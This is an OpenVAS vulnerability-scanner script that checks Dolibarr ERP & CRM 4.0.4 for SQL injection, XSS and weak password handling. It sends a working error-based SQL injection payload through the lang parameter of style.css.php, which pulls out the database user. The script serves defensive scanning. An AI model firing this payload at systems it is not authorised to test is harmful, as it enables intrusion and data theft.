###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dolibarr_404_mult_vuln.nasl 6157 2017-05-18 08:15:25Z teissa $
#
# Dolibarr ERP & CRM <= 4.0.4 Multiple Vulnerabilities
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:dolibarr:dolibarr";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108160");
  script_version("$Revision: 6157 $");
  script_cve_id("CVE-2017-7886", "CVE-2017-7887", "CVE-2017-7888", "CVE-2017-7889");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-18 10:15:25 +0200 (Thu, 18 May 2017) $");
  script_tag(name:"creation_date", value:"2017-05-15 10:42:44 +0200 (Mon, 15 May 2017)");
  script_name("Dolibarr ERP & CRM <= 4.0.4 Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dolibarr_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Dolibarr/installed");

  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2017/q2/243");
  script_xref(name:"URL", value:"https://www.foxmole.com/advisories/foxmole-2017-02-23.txt");

  tag_summary = "This host is running Dolibarr ERP & CRM and is prone to multiple vulnerabilities.";

  tag_impact = "Successful exploitation will allow an attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of a vulnerable site and to cause
  SQL Injection attacks to gain sensitive information.

  Impact Level: Application/System";

  tag_affected = "Dolibarr version 4.0.4 is vulnerable; other versions may also be affected.";

  tag_insight = "Multiple flaws exists:

  - SQL Injection in /theme/eldy/style.css.php via the lang parameter.

  - XSS in /societe/list.php via the sall parameter.

  - storing of passwords with the MD5 algorithm, which makes brute-force attacks easier.

  - allowing password changes without supplying the current password, which makes it easier for
  physically proximate attackers to obtain access via an unattended workstation.";

  tag_solution = "No solution or patch is available as of 15th May, 2017. Information regarding this
  issue will be updated once the solution details are available.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"solution_type", value:"NoneAvailable");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

url = dir + "/theme/eldy/style.css.php?lang=de%27%20procedure%20analyse(extractvalue(rand()%2cconcat(concat(0x3a,CURRENT_USER())))%2c1)--%201";

if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:"Latest database access request error:</b> SELECT transkey, transvalue FROM (.*)overwrite_trans where lang=" ) ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );